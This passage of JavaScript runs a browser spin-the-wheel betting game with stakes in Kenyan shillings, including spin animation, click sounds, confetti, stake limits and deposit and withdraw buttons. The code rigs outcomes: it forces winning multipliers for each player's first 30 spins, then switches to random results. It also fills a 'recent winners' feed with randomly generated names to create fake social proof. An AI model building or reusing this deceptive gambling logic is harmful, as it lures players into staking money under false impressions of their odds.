    const ratio = (nextTickAngle - spinStartAngle) / spinTotalDelta;
    if (ratio >= 1.0) break; // past the end of this spin

    // Invert easeOut: t = 1 - (1 - ratio)^(1/4)
    if (ratio < 0) { nextTickAngle += TICK_EVERY_RADIANS; continue; }
    const t = 1 - Math.pow(1 - ratio, 0.25);
    const wallTimeSec = (spinStartTime / 1000) + t * (SPIN_DURATION_MS / 1000);
    const audioTime = wallTimeSec + audioClockOffset;

    if (audioTime > now + LOOKAHEAD_SEC) break; // beyond lookahead window, wait

    if (audioTime >= now - 0.005) { // only schedule future (or very near) clicks
      // Instantaneous normalised speed — maps to intensity / subtle pitch
      const speed = easeOutDerivative(t); // high early, ~0 at end
      const maxSpeed = easeOutDerivative(0); // = 4
      const intensity = Math.min(speed / maxSpeed, 1); // 0–1
      playClick(Math.max(audioTime, now + 0.001), intensity);
    }

    nextTickAngle += TICK_EVERY_RADIANS;
  }

  // Re-run every 50 ms — tight enough to stay ahead without overloading
  tickSchedulerTimer = setTimeout(scheduleTicksAhead, 50);
}

function spin() {
  if (spinning) return;

  const stake = parseInt(stakeInput.value, 10);
  if (isNaN(stake) || stake < 1) {
    resultMsg.innerText = '⚠️ enter valid stake';
    return;
  }
  if (stake > balance) {
    resultMsg.innerText = '❌ insufficient balance';
    return;
  }

  balance -= stake;
  updateBalanceUI();
  spinning = true;
  resultMsg.innerText = '🎰 spinning...';

  // Pick the landing multiplier before the spin starts
  let chosenMult;
  if (spinCount < 30) {
    chosenMult = positiveMultipliers[Math.floor(Math.random() * positiveMultipliers.length)];
  } else {
    const allMults = segments.map(s => s.multiplier);
    chosenMult = allMults[Math.floor(Math.random() * allMults.length)];
  }

  // Compute the exact wheel angle so the pointer lands on the chosen segment centre
  const segIndex = segments.findIndex(s => s.multiplier === chosenMult);
  const pointerAngle = (3 * Math.PI) / 2;
  const segCenterOffset = segIndex * angleStep + angleStep / 2;
  let targetWheelAngle = pointerAngle - segCenterOffset;
  targetWheelAngle = ((targetWheelAngle % (Math.PI * 2)) + Math.PI * 2) % (Math.PI * 2);

  const currentNorm = ((wheelAngle % (Math.PI * 2)) + Math.PI * 2) % (Math.PI * 2);
  let delta = targetWheelAngle - currentNorm;
  if (delta <= 0) delta += Math.PI * 2;
  const fullRotations = 5 + Math.floor(Math.random() * 4);
  delta += fullRotations * Math.PI * 2;

  spinStartAngle = wheelAngle;
  spinTotalDelta = delta;
  spinStartTime = performance.now();

  // Prime the tick scheduler: first click at the next segment boundary
  // ahead of current wheel position
  nextTickAngle = spinStartAngle + TICK_EVERY_RADIANS;

  initAudio();
  if (audioCtx.state === 'suspended') audioCtx.resume();
  stopTickScheduler();
  scheduleTicksAhead();

  function spinAnimation(now) {
    const elapsed = now - spinStartTime;
    const t = Math.min(elapsed / SPIN_DURATION_MS, 1);
    wheelAngle = spinStartAngle + spinTotalDelta * easeOut(t);
    drawWheel(wheelAngle);

    if (t < 1) {
      animationFrame = requestAnimationFrame(spinAnimation);
    } else {
      // Land exactly
      wheelAngle = spinStartAngle + spinTotalDelta;
      drawWheel(wheelAngle);
      spinning = false;
      stopTickScheduler();
      animationFrame = null;

      const multValue = parseInt(chosenMult.replace('X', ''), 10) || 0;
      const winAmount = stake * multValue;

      if (winAmount > 0) {
        balance += winAmount;
        updateBalanceUI();
        resultMsg.innerHTML = `🎉 WIN! ${chosenMult} = ${winAmount} Kes 🎉`;
        const newWin = { name: randomName(), mult: chosenMult, stake, value: winAmount };
        winnersFeed.unshift(newWin);
        winnersFeed = winnersFeed.slice(0, 5);
        renderWinnersFeed();
        if (winAmount >= 500) triggerConfetti();
      } else {
        resultMsg.innerHTML = `😞 ${chosenMult} ... try again`;
      }
      spinCount++;
    }
  }

  animationFrame = requestAnimationFrame(spinAnimation);
}

// ====================== Confetti ======================
const confettiCanvas = document.getElementById('confetti-canvas');
const confettiCtx = confettiCanvas.getContext('2d');
let confettiParticles = [];
let confettiAnimation = null;

function triggerConfetti() {
  for (let i = 0; i < 50; i++) {
    confettiParticles.push({
      x: Math.random() * window.innerWidth,
      y: -10,
      vx: (Math.random() - 0.5) * 7,
      vy: Math.random() * 4 + 3,
      color: `hsl(${Math.random() * 360}, 80%, 60%)`,
      size: Math.random() * 6 + 3
    });
  }
  if (confettiAnimation) cancelAnimationFrame(confettiAnimation);
  function drawConfetti() {
    confettiCtx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
    confettiParticles = confettiParticles.filter(p => p.y < window.innerHeight + 50);
    confettiParticles.forEach(p => {
      p.x += p.vx;
      p.y += p.vy;
      p.vy += 0.1;
      confettiCtx.fillStyle = p.color;
      confettiCtx.fillRect(p.x, p.y, p.size, p.size * 0.6);
    });
    if (confettiParticles.length > 0) {
      confettiAnimation = requestAnimationFrame(drawConfetti);
    } else {
      confettiAnimation = null;
    }
  }
  confettiCanvas.width = window.innerWidth;
  confettiCanvas.height = window.innerHeight;
  drawConfetti();
}

// ====================== Event Listeners ======================
spinBtn.addEventListener('click', (e) => { e.stopPropagation(); spin(); });
canvas.addEventListener('click', spin);
canvas.addEventListener('touchstart', (e) => { e.preventDefault(); spin(); });
canvas.addEventListener('contextmenu', (e) => e.preventDefault());
depositBtn.addEventListener('click', () => createModal('deposit'));
withdrawBtn.addEventListener('click', () => createModal('withdraw'));

// ====================== Initialization ======================
loadBalance();
drawWheel(wheelAngle);
renderWinnersFeed();

window.addEventListener('resize', () => {
  confettiCanvas.width = window.innerWidth;
  confettiCanvas.height = window.innerHeight;
});

// ====================== Stake Apply Button ======================
const applyStakeBtn = document.getElementById('applyStakeBtn');

function validateAndApplyStake() {
  let stake = parseInt(stakeInput.value, 10);
  if (isNaN(stake) || stake < 1) {
    stake = 1;
    stakeInput.value = 1;
    showStakeHint('Minimum stake is KES 1', 'error');
  } else if (stake > balance) {
    stake = balance;
    stakeInput.value = balance;
    showStakeHint(`Stake adjusted to available balance: KES ${balance}`, 'warning');
  } else if (stake > 10000) {
    stake = 10000;
    stakeInput.value = 10000;
    showStakeHint('Maximum stake is KES 10,000', 'warning');
  } else {
    showStakeHint(`Stake set to KES ${stake}`, 'success');
  }
  stakeInput.max = Math.min(balance, 10000);
}

function showStakeHint(message, type) {
  const stakeHint = document.getElementById('stakeHint');
  const icon = stakeHint.querySelector('i');
  const span = stakeHint.querySelector('span');
  span.textContent = message;
  icon.className = 'fas';
  if (type === 'error') {
    icon.className += ' fa-exclamation-circle';
    icon.style.color = '#e74c3c';
  } else if (type === 'warning') {
    icon.className += ' fa-exclamation-triangle';
    icon.style.color = '#f39c12';
  } else {
    icon.className += ' fa-check-circle';
    icon.style.color = '#f1c40f';
  }
  setTimeout(() => {
    icon.className = 'fas fa-info-circle';
    icon.style.color = '#f1c40f';
    span.textContent = 'Click ✓ or press Enter to set stake';
  }, 3000);
}

applyStakeBtn.addEventListener('click', validateAndApplyStake);

stakeInput.addEventListener('keypress', (e) => {
  if (e.key === 'Enter') { e.preventDefault(); validateAndApplyStake(); }
});

stakeInput.addEventListener('blur', () => {
  let stake = parseInt(stakeInput.value, 10);
  if (isNaN(stake) || stake < 1) stakeInput.value = 1;
  else if (stake > balance) stakeInput.value = balance;
  else if (stake > 10000) stakeInput.value = 10000;
});

stakeChips.forEach(chip => {
  chip.addEventListener('click', () => {
    let amount = parseInt(chip.dataset.amount, 10);
    const currentVal = parseInt(stakeInput.value, 10) || 0;
    let newVal = currentVal + amount;
    if (newVal > balance) newVal = balance;
    if (newVal < 1) newVal = 1;
    stakeInput.value = newVal;
    showStakeHint(`+${amount} added. Stake: KES ${newVal}`, 'success');
  });
});